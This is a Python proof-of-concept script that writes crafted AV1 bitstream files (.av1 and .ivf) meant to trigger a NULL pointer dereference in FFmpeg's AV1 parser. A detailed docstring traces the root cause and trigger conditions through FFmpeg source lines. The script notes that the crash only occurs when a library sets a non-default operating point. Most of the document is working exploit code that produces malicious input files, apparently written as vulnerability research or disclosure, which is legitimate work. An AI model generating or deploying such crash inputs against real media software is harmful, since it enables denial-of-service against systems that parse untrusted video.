#!/usr/bin/env python3
"""
PoC generator for VULN 001: NULL Dereference in av1_parser_parse via Dropped OBU Content
CWE-476 (NULL Pointer Dereference)

ROOT CAUSE
----------
av1_parser_parse() in libavcodec/av1_parser.c:101-113 dereferences unit->content
without checking for NULL:

    const AV1RawOBU *obu = unit->content;   // can be NULL!
    ...
    if (unit->type == AV1_OBU_FRAME)
        frame = &obu->obu.frame.header;      // NULL deref if obu==NULL
    else if (unit->type == AV1_OBU_FRAME_HEADER)
        frame = &obu->obu.frame_header;      // NULL deref if obu==NULL

unit->content is set to NULL (without error) when cbs_av1_read_unit() returns
AVERROR(EAGAIN), which happens in the operating_point drop path (cbs_av1.c:879-888):

    if (obu->header.obu_extension_flag) {
        if (...type not SEQUENCE_HEADER/TEMPORAL_DELIMITER...
            && priv->operating_point_idc) {
            int in_temporal = (priv->operating_point_idc >> priv->temporal_id) & 1;
            int in_spatial  = (priv->operating_point_idc >> (priv->spatial_id+8)) & 1;
            if (!in_temporal || !in_spatial)
                return AVERROR(EAGAIN);   // → cbs.c:202: content = NULL
        }
    }

TRIGGER CONDITIONS
------------------
1. CBS context must have operating_point_idc != 0
   - Requires priv->operating_point >= 0 (not the default -1)
   - When operating_point=0: idc = seq->operating_point_idc[0]

2. SEQUENCE_HEADER OBU with operating_point_idc[0] NOT covering the OBU's temporal layer
   - Example: idc=0x101 (temporal_id=0 and spatial_id=0 only)

3. FRAME or FRAME_HEADER OBU with obu_extension_flag=1 and temporal_id=1
   - Drop check: (0x101 >> 1) & 1 = 0 → DROPPED → content=NULL

4. Then av1_parser_parse loop dereferences NULL obu → CRASH

LIMITATION OF THIS PoC
-----------------------
The AV1 PARSER (av1_parser.c) initializes its CBS with operating_point=-1 (the default).
With operating_point=-1, the guard at cbs_av1.c:901 prevents operating_point_idc from
being set, so it stays 0. The drop check is therefore always SKIPPED in the parser's CBS.

The vulnerability IS present in the code (the null check is missing) but requires the CBS
context to be configured with operating_point >= 0 to be triggered. This would occur when:
- A library user calls av_opt_set_int(parser_cbs->priv_data, "operating_point", 0, 0)
- OR a modified/extended parser explicitly propagates the operating_point option

This PoC generates the input file that WOULD trigger the crash under such configuration
and attempts to exercise the code path via the standard ffmpeg binary.

FILES GENERATED
---------------
- vuln_001_input_raw.av1 : Raw AV1 OBU bitstream (for OBU demuxer path)
- vuln_001_input.ivf     : IVF container (bypasses av1_frame_merge BSF)
"""

import os
import struct

OUTDIR = os.path.dirname(os.path.abspath(__file__))

# ---------------------------------------------------------------------------
# Bit writer
# ---------------------------------------------------------------------------

def leb128(value):
    """Encode unsigned integer as LEB128."""
    result = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)


def make_obu(obu_type, payload, extension_flag=False, temporal_id=0, spatial_id=0):
    """
    Build one AV1 OBU with obu_has_size_field=1.

    OBU header byte layout (AV1 spec, obu_header()):
      bit 7:   obu_forbidden_bit = 0
      bits 6-3: obu_type (4 bits)
      bit 2:   obu_extension_flag
      bit 1:   obu_has_size_field = 1
      bit 0:   obu_reserved_1bit = 0

    OBU extension byte (if extension_flag=1, obu_extension_header()):
      bits 7-5: temporal_id (3 bits)
      bits 4-3: spatial_id  (2 bits)
      bits 2-0: extension_header_reserved_3bits = 0
    """
    header = (obu_type << 3) | (int(extension_flag) << 2) | (1 << 1) | 0
    result = bytes([header])
    if extension_flag:
        ext = (temporal_id << 5) | (spatial_id << 3) | 0
        result += bytes([ext])
    result += leb128(len(payload))
    result += payload
    return result


def build_sequence_header_payload():
    """
    Build AV1 sequence_header_obu() payload (packed bits, MSB first).

    operating_point_idc[0] = 0x101

    Drop filter (cbs_av1.c:884,886) — only active when operating_point_idc != 0:
      in_temporal = (idc >> temporal_id) & 1
        tid=0: (0x101 >> 0) & 1 = 1  → included
        tid=1: (0x101 >> 1) & 1 = 0  → DROPPED → content=NULL → NULL DEREF
      in_spatial  = (idc >> (spatial_id + 8)) & 1
        sid=0: (0x101 >> 8) & 1 = 1  → included
    """
    bits = []

    def wb(value, n):
        for i in range(n - 1, -1, -1):
            bits.append((value >> i) & 1)

    # sequence_header_obu() fields (AV1 spec section 5.5):
    wb(0, 3)    # seq_profile = 0
    wb(0, 1)    # still_picture = 0
    wb(0, 1)    # reduced_still_picture_header = 0
    # (reduced_still_picture_header == 0 branch):
    wb(0, 1)    # timing_info_present_flag = 0
    wb(0, 1)    # initial_display_delay_present_flag = 0
    wb(0, 5)    # operating_points_cnt_minus_1 = 0 (one operating point)
    # operating_point[0]:
    wb(0x101, 12)  # operating_point_idc[0] = 0x101
    wb(0, 5)    # seq_level_idx[0] = 0 (level 2.0; no seq_tier since <=7)
    # frame_size:
    wb(0, 4)    # frame_width_bits_minus_1 = 0 (1 bit for width)
    wb(0, 4)    # frame_height_bits_minus_1 = 0 (1 bit for height)
    wb(0, 1)    # max_frame_width_minus_1 = 0 → 1 px wide
    wb(0, 1)    # max_frame_height_minus_1 = 0 → 1 px tall
    wb(0, 1)    # frame_id_numbers_present_flag = 0
    # codec features:
    wb(0, 1)    # use_128x128_superblock = 0
    wb(0, 1)    # enable_filter_intra = 0
    wb(0, 1)    # enable_intra_edge_filter = 0
    wb(0, 1)    # enable_interintra_compound = 0
    wb(0, 1)    # enable_masked_compound = 0
    wb(0, 1)    # enable_warped_motion = 0
    wb(0, 1)    # enable_dual_filter = 0
    wb(0, 1)    # enable_order_hint = 0 (no jnt_comp/ref_frame_mvs)
    wb(0, 1)    # seq_choose_screen_content_tools = 0
    wb(0, 1)    # seq_force_screen_content_tools = 0 (since choose=0)
    # (no seq_choose_integer_mv since force=0)
    wb(0, 1)    # enable_superres = 0
    wb(0, 1)    # enable_cdef = 0
    wb(0, 1)    # enable_restoration = 0
    # color_config():
    wb(0, 1)    # high_bitdepth = 0 → BitDepth=8
    wb(0, 1)    # mono_chrome = 0 (seq_profile != 1)
    wb(0, 1)    # color_description_present_flag = 0
    wb(0, 1)    # color_range = 0
    # seq_profile=0 → subX=1, subY=1 (4:2:0, implicit)
    wb(0, 2)    # chroma_sample_position = CSP_UNKNOWN
    wb(0, 1)    # separate_uv_delta_q = 0
    wb(0, 1)    # film_grain_params_present = 0
    # AV1 byte_alignment(): trailing_one_bit=1 + zero fill to byte boundary
    # (cbs_av1.c:1020: cbs_av1_read_trailing_bits; cbs_av1_syntax_template.c:50-65)
    wb(1, 1)    # trailing_one_bit = 1 (REQUIRED)
    # trailing zeros are added by the padding below

    while len(bits) % 8 != 0:
        bits.append(0)

    payload = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | bits[i + j]
        payload.append(byte)

    return bytes(payload)


# ---------------------------------------------------------------------------
# IVF container helpers
# ---------------------------------------------------------------------------

IVF_HEADER_SIZE = 32
IVF_FRAME_HEADER_SIZE = 12

def ivf_header(width=1, height=1, fps_num=30, fps_den=1, frame_count=1):
    """Build a 32-byte IVF file header for AV1 (fourcc='AV01')."""
    return struct.pack('<4sHH4sHHIIII',
        b'DKIF',       # signature
        0,             # version
        IVF_HEADER_SIZE,
        b'AV01',       # fourcc
        width, height,
        fps_num, fps_den,
        frame_count,
        0              # reserved
    )

def ivf_frame(data, timestamp=0):
    """Wrap AV1 OBU data in an IVF frame header."""
    return struct.pack('<IQ', len(data), timestamp) + data


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    # ── OBU payloads ──────────────────────────────────────────────────────

    # OBU 1: Temporal Delimiter (type=2, no extension, empty payload)
    td_obu = make_obu(2, b'')

    # OBU 2: Sequence Header (type=1, no extension)
    #   Sets operating_point_idc[0]=0x101 so only tid=0,sid=0 are in-layer.
    #   The parser needs av1->sequence_header non-NULL before the OBU loop
    #   (av1_parser.c:93-96 bails early otherwise).
    seq_payload = build_sequence_header_payload()
    seq_obu = make_obu(1, seq_payload)

    # OBU 3: Frame Header (type=3) with obu_extension_flag=1, temporal_id=1
    #
    # VULNERABILITY PATH (when parser CBS has operating_point_idc != 0):
    #   cbs_av1.c:883-888:
    #     in_temporal = (0x101 >> temporal_id=1) & 1 = 0 → EAGAIN
    #   cbs.c:202:
    #     unit->content = NULL
    #   av1_parser.c:103,108-109:
    #     obu = unit->content = NULL
    #     frame = &obu->obu.frame_header   ← NULL POINTER DEREFERENCE
    #
    # NOTE: In the standard ffmpeg binary, the PARSER's CBS has operating_point=-1
    # (cbs_av1.c option default), so operating_point_idc stays 0 after parsing the
    # sequence header. The drop check at cbs_av1.c:882 is therefore never triggered
    # in the parser context, and this NULL deref cannot be exercised via -i input.
    # It WOULD be triggered by a library user who sets operating_point=0 on the
    # parser CBS (as the AV1 DECODER does at av1dec.c:895).
    frame_hdr_obu = make_obu(3, b'\x00' * 4,
                              extension_flag=True, temporal_id=1, spatial_id=0)

    # ── File 1: Raw AV1 OBU bitstream (.av1) ──────────────────────────────
    # Goes through OBU demuxer → av1_frame_merge BSF.
    # av1_frame_merge has its own CBS (operating_point_idc=0 too) and will try
    # to FULLY PARSE the frame header OBU. Because the 4-byte payload is not a
    # valid frame header bitstream, av1_frame_merge returns an error and no
    # packet reaches the av1 parser.
    raw_data = td_obu + seq_obu + frame_hdr_obu
    raw_path = os.path.join(OUTDIR, 'vuln_001_input_raw.av1')
    with open(raw_path, 'wb') as f:
        f.write(raw_data)

    # ── File 2: IVF container (.ivf) ──────────────────────────────────────
    # IVF demuxer does NOT use av1_frame_merge. Each IVF frame is passed
    # directly to the AV1 parser. This avoids the av1_frame_merge blocker.
    # However, the parser's CBS still has operating_point=-1 → idc=0 → no drop.
    #
    # Put both OBUs in one IVF frame (one temporal unit):
    #   Frame 0: TD + Sequence Header + Frame Header(tid=1)
    temporal_unit = td_obu + seq_obu + frame_hdr_obu
    ivf_data = (ivf_header(width=1, height=1, fps_num=30, fps_den=1, frame_count=1)
                + ivf_frame(temporal_unit, timestamp=0))
    ivf_path = os.path.join(OUTDIR, 'vuln_001_input.ivf')
    with open(ivf_path, 'wb') as f:
        f.write(ivf_data)

    print(f"Generated {raw_path} ({len(raw_data)} bytes)")
    print(f"Generated {ivf_path} ({len(ivf_data)} bytes)")
    print()
    print("OBU contents:")
    print(f"  Temporal Delimiter OBU : {len(td_obu)} bytes")
    print(f"  Sequence Header OBU    : {len(seq_obu)} bytes  "
          f"(payload {len(seq_payload)} bytes)")
    print(f"  Frame Header OBU       : {len(frame_hdr_obu)} bytes  "
          f"(tid=1, sid=0, extension_flag=1)")
    print()
    print("Drop filter arithmetic (cbs_av1.c:884,886):")
    idc = 0x101
    tid = 1
    print(f"  operating_point_idc[0] = 0x{idc:03X}")
    print(f"  in_temporal = (0x{idc:03X} >> {tid}) & 1 = {(idc >> tid) & 1}  "
          f"→ {'DROPPED → content=NULL → NULL DEREF (if idc!=0)' if (idc >> tid) & 1 == 0 else 'included'}")
    print()
    print("NOTE: Standard ffmpeg parser CBS has operating_point=-1")
    print("      → operating_point_idc never set → drop check always SKIPPED")
    print("      → vulnerability NOT directly triggerable via 'ffmpeg -i'")
    print("      → would be triggered by a library user setting operating_point=0")


if __name__ == '__main__':
    main()
